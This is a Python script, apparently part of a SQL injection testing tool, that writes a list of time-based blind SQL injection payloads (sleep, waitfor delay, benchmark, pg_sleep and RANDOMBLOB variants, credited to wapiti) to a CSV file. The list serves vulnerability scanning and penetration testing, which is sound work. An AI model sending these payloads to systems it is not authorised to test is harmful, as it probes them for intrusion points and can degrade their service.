
"""
# SQLGO License - Version 1.1

Copyright (C) 2023-2024 Heisenberg

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.


"""

import csv

# SQL injection patterns
sql_injection_patterns = [
    "# from wapiti",
    "sleep(5)#",
    "1 or sleep(5)#",
    "\" or sleep(5)#",
    "' or sleep(5)#",
    "\" or sleep(5)=\"",
    "' or sleep(5)='",
    "1) or sleep(5)#",
    "\") or sleep(5)=\"",
    "\') or sleep(5)='",
    "1)) or sleep(5)#",
    "\")) or sleep(5)=\"",
    "\')) or sleep(5)='",
    ";waitfor delay '0:0:5'--",
    ");waitfor delay '0:0:5'--",
    "';waitfor delay '0:0:5'--",
    "\";waitfor delay '0:0:5'--",
    "');waitfor delay '0:0:5'--",
    "\");waitfor delay '0:0:5'--",
    "));waitfor delay '0:0:5'--",
    "'));waitfor delay '0:0:5'--",
    "\"));waitfor delay '0:0:5'--",
    "benchmark(10000000,MD5(1))#",
    "1 or benchmark(10000000,MD5(1))#",
    "\" or benchmark(10000000,MD5(1))#",
    "' or benchmark(10000000,MD5(1))#",
    "1) or benchmark(10000000,MD5(1))#",
    "\") or benchmark(10000000,MD5(1))#",
    "\') or benchmark(10000000,MD5(1))#",
    "1)) or benchmark(10000000,MD5(1))#",
    "\")) or benchmark(10000000,MD5(1))#",
    "\')) or benchmark(10000000,MD5(1))#",
    "pg_sleep(5)--",
    "1 or pg_sleep(5)--",
    "\" or pg_sleep(5)--",
    "' or pg_sleep(5)--",
    "1) or pg_sleep(5)--",
    "\") or pg_sleep(5)--",
    "\') or pg_sleep(5)--",
    "1)) or pg_sleep(5)--",
    "\")) or pg_sleep(5)--",
    "\')) or pg_sleep(5)--",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--",
    "AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#",
    "SLEEP(5)#",
    "SLEEP(5)--",
    "SLEEP(5)=\"",
    "SLEEP(5)='",
    "or SLEEP(5)",
    "or SLEEP(5)#",
    "or SLEEP(5)--",
    "or SLEEP(5)=\"",
    "or SLEEP(5)='",
    "waitfor delay '00:00:05'",
    "waitfor delay '00:00:05'--",
    "waitfor delay '00:00:05'#",
    "benchmark(50000000,MD5(1))",
    "benchmark(50000000,MD5(1))--",
    "benchmark(50000000,MD5(1))#",
    "or benchmark(50000000,MD5(1))",
    "or benchmark(50000000,MD5(1))--",
    "or benchmark(50000000,MD5(1))#",
    "pg_SLEEP(5)",
    "pg_SLEEP(5)--",
    "pg_SLEEP(5)#",
    "or pg_SLEEP(5)",
    "or pg_SLEEP(5)--",
    "or pg_SLEEP(5)#",
    "'\\\"",
    "AnD SLEEP(5)",
    "AnD SLEEP(5)--",
    "AnD SLEEP(5)#",
    "&&SLEEP(5)",
    "&&SLEEP(5)--",
    "&&SLEEP(5)#",
    "' AnD SLEEP(5) ANd '1",
    "'&&SLEEP(5)&&'1",
    "ORDER BY SLEEP(5)",
    "ORDER BY SLEEP(5)--",
    "ORDER BY SLEEP(5)#",
    "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)",
    "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#",
    "(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--",
    "+benchmark(3200,SHA1(1))+",
    "+ SLEEP(10) +",
    "RANDOMBLOB(500000000/2)",
    "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
    "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))",
    "RANDOMBLOB(1000000000/2)",
    "AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
    "OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))",
    "SLEEP(1)/*' or SLEEP(1) or '\" or SLEEP(1) or \"*/",
]

# Specify the file name
csv_file_name = 'sql_injection_patterns.csv'

# Write the SQL patterns to a CSV file
with open(csv_file_name, mode='w', newline='') as csv_file:
    csv_writer = csv.writer(csv_file)
    
    # Write header
    csv_writer.writerow(['SQL Injection Patterns'])
    
    # Write each SQL pattern
    for sql_pattern in sql_injection_patterns:
        csv_writer.writerow([sql_pattern])

print(f'CSV file "{csv_file_name}" generated successfully.')
